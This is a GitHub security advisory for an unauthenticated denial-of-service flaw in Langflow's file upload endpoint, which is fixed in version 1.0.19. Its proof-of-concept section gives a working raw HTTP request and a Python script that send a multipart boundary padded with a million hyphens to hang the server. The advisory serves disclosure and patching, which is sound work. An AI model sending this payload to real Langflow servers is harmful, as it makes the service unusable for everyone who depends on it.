# [H] Langflow: Unauthenticated DoS through multipart form boundary file upload

## Summary
Severity: High
Advisory: GHSA-qwqc-p3q8-wcg9
CVE: CVE-2026-55446
CWE: CWE-400
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-qwqc-p3q8-wcg9
Type: github-advisory

## Affected
- PyPI: `langflow` — affected >=0 <1.0.19

## Details
### Summary
An attacker can send a `/api/v1/files/upload/` request without any authentication token/cookies and abuse a very long multipart form boundary to make the langflow app unusable for all users for an indefinite amount of time. 

### Details
https://github.com/langflow-ai/langflow/blob/v1.0.18/src/backend/base/langflow/api/v1/files.py#L40

The file upload function will try to process the multipart form data even if it is malformed and contains a payload such as an extremely large amount of hyphens after the boundary. It also does not do the authentication check before trying to process this data so an unauthenticated attacker can perform this as well as authenticated users. 

Additionally, an attacker doesn't even need to know a valid UUID of a flow to send this request because the server will still try to process the large boundary even with any random value in place of the flow ID. 

### PoC

An attacker makes this request to upload a file without valid authentication information or a valid flow ID: 

```
POST /api/v1/files/upload/test HTTP/1.1
Host: 127.0.0.1:7860
Content-Length: 3000192
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryorGBAKSkv5wR6WqJ
Accept: application/json, text/plain, */*
Origin: http://127.0.0.1:7860
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryorGBAKSkv5wR6WqJ
Content-Disposition: form-data; name="file"; filename="dos.txt"
Content-Type: text/plain

DoS in progress!

------WebKitFormBoundaryorGBAKSkv5wR6WqJ------------<insert a large amount of hyphens such as 1,000,000>
```

Here is the request in python: 

```python
import requests

url = "http://127.0.0.1:7860/api/v1/files/upload/test"

headers = {
    "Content-Type": "multipart/form-data; boundary=---------------------------WebKitFormBoundaryorGBAKSkv5wR6WqJ"
}

data = (
    "-----------------------------WebKitFormBoundaryorGBAKSkv5wR6WqJ\r\n"
    "Content-Disposition: form-data; name=\"file\"; filename=\"dos.txt\"\r\n"
    "Content-Type: text/plain\r\n\r\n"
    "DoS in progress\r\n"
    "-----------------------------WebKitFormBoundaryorGBAKSkv5wR6WqJ--" + '-' * 1000000 + "\r\n"
)

response = requests.post(url, headers=headers, data=data)
```

The app will then be stuck in the "server is busy" state for all users:

<img width="733" alt="image" src="https://github.com/user-attachments/assets/227169d8-f1b7-4072-8c09-e416e4808d05">

### Impact
Sending this request will result in the server being unusable for all users for an infinite amount of time because the request can be repeated as much as you want.

### Patches
Fixed in **1.0.19** via PR [#3923](https://github.com/langflow-ai/langflow/pull/3923). A `check_boundary` HTTP middleware was added that validates the multipart boundary (`^[\w\-]{1,70}$`) and rejects malformed requests — including the oversized-hyphen payload — with `HTTP 422` **before** the body is parsed. The upload endpoint also gained an authentication and flow-ownership check (`get_current_active_user` + `403` on mismatch), closing the unauthenticated access vector. Upgrade to **1.0.19 or later**.

## References
- https://github.com/langflow-ai/langflow/security/advisories/GHSA-qwqc-p3q8-wcg9
- https://github.com/langflow-ai/langflow/pull/3923
- https://github.com/langflow-ai/langflow
- https://github.com/langflow-ai/langflow/blob/v1.0.18/src/backend/base/langflow/api/v1/files.py#L40
